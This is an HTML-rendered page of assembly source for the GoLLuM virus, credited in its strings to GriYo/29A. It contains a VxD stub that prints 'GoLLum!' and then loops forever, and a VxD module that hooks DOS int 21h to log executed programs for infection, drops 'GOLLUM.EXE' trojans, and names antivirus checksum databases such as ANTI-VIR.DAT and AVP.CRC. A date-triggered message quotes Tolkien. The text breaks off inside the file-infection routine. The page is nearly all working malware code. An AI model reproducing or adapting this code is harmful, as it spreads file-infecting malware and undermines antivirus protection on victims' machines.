<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win16.Gollum - vxdstub.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; - -[VXDSTUB.ASM - VxD stub used in trojans] - - - - - - - - - - - - - -&gt;8</span><span class="sc0">

    </span><span class="sc9">name</span><span class="sc0"> </span><span class="sc5">vxdstub</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">

</span><span class="sc1">;Activation routine</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">vxdstub</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0">
    </span><span class="sc1">;Segment regs!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;Set video mode 80x25x16c</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc1">;Print "Gollum!"</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1301h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0007h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0A24h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Gollum_Says</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc1">;Endless loop</span><span class="sc0">
</span><span class="sc5">Dead_Zone</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc1">;Aaaarrrgggghhhhh!!!!</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dead_Zone</span><span class="sc0">

        </span><span class="sc1">;Text printed on screen</span><span class="sc0">
</span><span class="sc5">Gollum_Says</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GoLLum!"</span><span class="sc0">

</span><span class="sc5">vxdstub</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">vxdstub</span><span class="sc0">

</span><span class="sc1">; - -[WGOLLUM.ASM - VxD virus code] - - - - - - - - - - - - - - - - - - -&gt;8</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc1">;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커</span><span class="sc0">
</span><span class="sc1">;쿔ncludes                                                                </span><span class="sc0">
</span><span class="sc1">;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸</span><span class="sc0">

</span><span class="sc9">.XLIST</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">Vmm.Inc</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">SheLL.Inc</span><span class="sc0">
</span><span class="sc9">.LIST</span><span class="sc0">

</span><span class="sc1">;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커</span><span class="sc0">
</span><span class="sc1">;쿣irtual device declaration                                              </span><span class="sc0">
</span><span class="sc1">;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸</span><span class="sc0">

</span><span class="sc5">Declare_Virtual_Device</span><span class="sc0"> </span><span class="sc5">WGoLLuM</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc5">WGoLLuM_Control</span><span class="sc4">,</span><span class="sc5">Undefined_Device_ID</span><span class="sc4">,,,</span><span class="sc0">

</span><span class="sc1">;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커</span><span class="sc0">
</span><span class="sc1">;쿔nitialization data segment                                             </span><span class="sc0">
</span><span class="sc1">;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸</span><span class="sc0">

</span><span class="sc5">VxD_IDATA_SEG</span><span class="sc0">

</span><span class="sc5">VxD_Installation_Title</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GoLLuM ViRuS by GriYo/29A"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">VxD_Installation_Msg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Deep down here by the dark water lived old "</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Gollum, a small slimy creature. I dont know "</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"where he came from, nor who or what he was. "</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"He was a Gollum -as dark as darkness, except "</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"for two big round pale eyes in his thin face."</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"J.R.R. ToLkieN ... The HoBBit"</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">VxD_IDATA_ENDS</span><span class="sc0">

</span><span class="sc1">;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커</span><span class="sc0">
</span><span class="sc1">;쿗ocal locked data segment                                               </span><span class="sc0">
</span><span class="sc1">;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸</span><span class="sc0">

</span><span class="sc5">VxD_LOCKED_DATA_SEG</span><span class="sc0">

</span><span class="sc5">Header_Size</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001Ch</span><span class="sc0">                </span><span class="sc1">;Dos .EXE header size</span><span class="sc0">
</span><span class="sc5">VxD_Size</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6592</span><span class="sc0">                 </span><span class="sc1">;VxD file size</span><span class="sc0">
            </span><span class="sc9">ALIGN</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">DOS_Virus_Code</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">            </span><span class="sc1">;Start of Dos virus code</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">gollum.inc</span><span class="sc0">       </span><span class="sc1">;Load Dos virus code</span><span class="sc0">
</span><span class="sc5">Header_Copy</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">Header_Size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;Buffer for old .EXE header</span><span class="sc0">
</span><span class="sc5">DOS_Virus_End</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">DOS_Virus_Size</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">DOS_Virus_End</span><span class="sc4">-</span><span class="sc5">DOS_Virus_Code</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Our_Own_Call_Flag</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"EERF"</span><span class="sc0">                    </span><span class="sc1">;Dos call from virus?</span><span class="sc0">
</span><span class="sc5">File_Size</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                 </span><span class="sc1">;Size of file to infect</span><span class="sc0">
</span><span class="sc5">Start_FileName</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                 </span><span class="sc1">;Filename start</span><span class="sc0">
</span><span class="sc5">VxD_Buffer</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;VxD file copy</span><span class="sc0">
</span><span class="sc5">Infect_FileName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">;Last executed file</span><span class="sc0">
</span><span class="sc5">File_Header</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">Header_Size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;Infected .EXE header</span><span class="sc0">
</span><span class="sc5">VxD_File_Name</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">;Path of virus VxD</span><span class="sc0">
</span><span class="sc5">Gollum_Name</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GOLLUM.386"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Name of virus VxD file</span><span class="sc0">
</span><span class="sc5">Trojan_File_Name</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GOLLUM.EXE"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Generated trojans</span><span class="sc0">
</span><span class="sc5">CheckSum_File_00</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ANTI-VIR.DAT"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;Names of av databases</span><span class="sc0">
</span><span class="sc5">CheckSum_File_01</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKLIST.TAV"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CheckSum_File_02</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKLIST.MS"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CheckSum_File_03</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"AVP.CRC"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CheckSum_File_04</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IVB.NTZ"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">Gollum_Handle</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">                     </span><span class="sc1">;VxD file handle</span><span class="sc0">
</span><span class="sc5">Victim_Handle</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">                     </span><span class="sc1">;Victim file handle</span><span class="sc0">
</span><span class="sc5">File_Attr</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">                     </span><span class="sc1">;Victim file attr</span><span class="sc0">
</span><span class="sc5">File_Time</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">                     </span><span class="sc1">;Victim file time</span><span class="sc0">
</span><span class="sc5">File_Date</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">                     </span><span class="sc1">;Victim file date</span><span class="sc0">

</span><span class="sc5">VxD_LOCKED_DATA_ENDS</span><span class="sc0">

</span><span class="sc1">;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커</span><span class="sc0">
</span><span class="sc1">;쿔nitialization code segment                                             </span><span class="sc0">
</span><span class="sc1">;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸</span><span class="sc0">

</span><span class="sc5">VxD_ICODE_SEG</span><span class="sc0">

</span><span class="sc1">;This is the virus startup code (Sys_Critical_Init)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Sys_Critical_Init</span><span class="sc0">
    
    </span><span class="sc1">;Get path of WIN386.EXE</span><span class="sc0">
    </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Get_Exec_Path</span><span class="sc0">
    </span><span class="sc1">;Copy path to our buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_File_Name</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Gollum_Name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc1">;Return, Sys_Critical_Init complete</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Sys_Critical_Init</span><span class="sc0">

</span><span class="sc1">;This is the virus startup code (Device_Init)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Device_Init</span><span class="sc0">
    
    </span><span class="sc1">;Hook int 21h so we can monitor dos file operations</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_Int_21h</span><span class="sc0">
    </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Hook_V86_Int_Chain</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Device_Init</span><span class="sc0">

</span><span class="sc1">;This is the virus startup code (Init_Complete)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Init_Complete</span><span class="sc0">

    </span><span class="sc1">;Check current date</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0604h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Not_Yet</span><span class="sc0">
    </span><span class="sc1">;Display instalation msg</span><span class="sc0">
    </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Get_SYS_VM_Handle</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_Installation_Msg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_Installation_Title</span><span class="sc0">
    </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">Shell_SYSMODAL_Message</span><span class="sc0">
</span><span class="sc5">Not_Yet</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Return, Sys_Critical_Init complete</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Init_Complete</span><span class="sc0">

</span><span class="sc5">VxD_ICODE_ENDS</span><span class="sc0">

</span><span class="sc1">;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커</span><span class="sc0">
</span><span class="sc1">;쿗ocked code segment                                                     </span><span class="sc0">
</span><span class="sc1">;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸</span><span class="sc0">

</span><span class="sc5">VxD_LOCKED_CODE_SEG</span><span class="sc0">

</span><span class="sc1">;This is a call-back routine to handle the messages that are sent</span><span class="sc0">
</span><span class="sc1">;to VxD's to control system operation</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Control</span><span class="sc0">

        </span><span class="sc5">Control_Dispatch</span><span class="sc0"> </span><span class="sc5">Sys_Critical_Init</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Sys_Critical_Init</span><span class="sc0">
        </span><span class="sc5">Control_Dispatch</span><span class="sc0"> </span><span class="sc5">Device_Init</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Device_Init</span><span class="sc0">       
        </span><span class="sc5">Control_Dispatch</span><span class="sc0"> </span><span class="sc5">Init_Complete</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Init_Complete</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">WGoLLuM_Control</span><span class="sc0">

</span><span class="sc1">;This is the virus int 21h handler</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">VxD_Int_21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">High_Freq</span><span class="sc0">
    
    </span><span class="sc1">;Save regs</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc1">;Check for our own calls (avoid recursive int 21h calls)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Our_Own_Call_Flag</span><span class="sc4">],</span><span class="sc3">"BUSY"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exit_VxD_Int_21h</span><span class="sc0">
    </span><span class="sc1">;Set flag</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Our_Own_Call_Flag</span><span class="sc4">],</span><span class="sc3">"BUSY"</span><span class="sc0">
    </span><span class="sc1">;Get called function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_AX</span><span class="sc4">]</span><span class="sc0">        
    </span><span class="sc1">;Check for Exec function calls</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Store_FileName</span><span class="sc0">
    </span><span class="sc1">;Check for Terminate with error-code 00h function calls</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Infect_Stored_FileName</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Drop_Exe_Trojan</span><span class="sc0">
</span><span class="sc5">Exit_VxD_Int_21h</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Clear flag</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Our_Own_Call_Flag</span><span class="sc4">],</span><span class="sc3">"FREE"</span><span class="sc0">
    </span><span class="sc1">;Restore regs</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;Int not served yet</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Save file name for later infection</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">Store_FileName</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc1">;Save filename into our buffer</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_DX</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_DS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Infect_FileName</span><span class="sc0">
</span><span class="sc5">Go_Thru_Filename</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Go_Thru_Filename</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_VxD_Int_21h</span><span class="sc0">

</span><span class="sc1">;Infect stored file name</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">Infect_Stored_FileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Check if working on C: drive</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Infect_FileName</span><span class="sc0">
